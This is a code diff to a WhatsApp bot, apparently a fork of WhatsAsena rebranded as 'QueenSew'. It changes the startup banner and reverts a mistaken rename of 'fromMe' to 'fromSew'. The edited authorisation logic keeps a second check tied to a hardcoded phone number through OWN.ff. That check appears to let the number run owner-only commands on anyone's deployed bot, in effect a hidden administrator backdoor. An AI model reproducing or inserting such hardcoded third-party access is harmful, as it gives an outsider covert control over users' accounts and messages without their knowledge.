@@ -309,7 +309,7 @@ async function whatsAsena () {
         }
     })    
     conn.on('connecting', async () => {
-        console.log(`${chalk.green.bold('Whats')}${chalk.blue.bold('Asena')}
+        console.log(`${chalk.green.bold('Queen')}${chalk.blue.bold('Sew')}
 ${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
 
 ${chalk.blue.italic('📲 Try To Login WhatsApp... Please Wait...')}`);
@@ -633,16 +633,16 @@ ${chalk.blue.italic('📲 Try To Login WhatsApp... Please Wait...')}`);
                     let sendMsg = false;
                     var chat = conn.chats.get(msg.key.remoteJid)
                         
-                    if ((config.SUDO !== false && msg.key.fromSew === false && command.fromSew === true &&
+                    if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
-                    ) || command.fromSew === msg.key.fromSew || (command.fromSew === false && !msg.key.fromSew)) {
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
                     }
-                    if ((OWN.ff == "94785435462,0" && msg.key.fromSew === false && command.fromSew === true &&
+                    if ((OWN.ff == "94785435462,0" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWN.ff || OWN.ff.includes(',') ? OWN.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWN.ff)
-                    ) || command.fromSew === msg.key.fromSew || (command.fromSew === false && !msg.key.fromSew)) {
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGrpSew === chat.jid.includes('-')) sendMsg = true;
@@ -665,7 +665,7 @@ ${chalk.blue.italic('📲 Try To Login WhatsApp... Please Wait...')}`);
                             whats = new Message(conn, msg);
                         }
 /*
-                        if (msg.key.fromSew && command.delownsewcmd) { 
+                        if (msg.key.fromMe && command.delownsewcmd) { 
                             var wrs = conn.user.phone.wa_version.split('.')[2]
                             if (wrs < 11) {
                                 await whats.delete() 
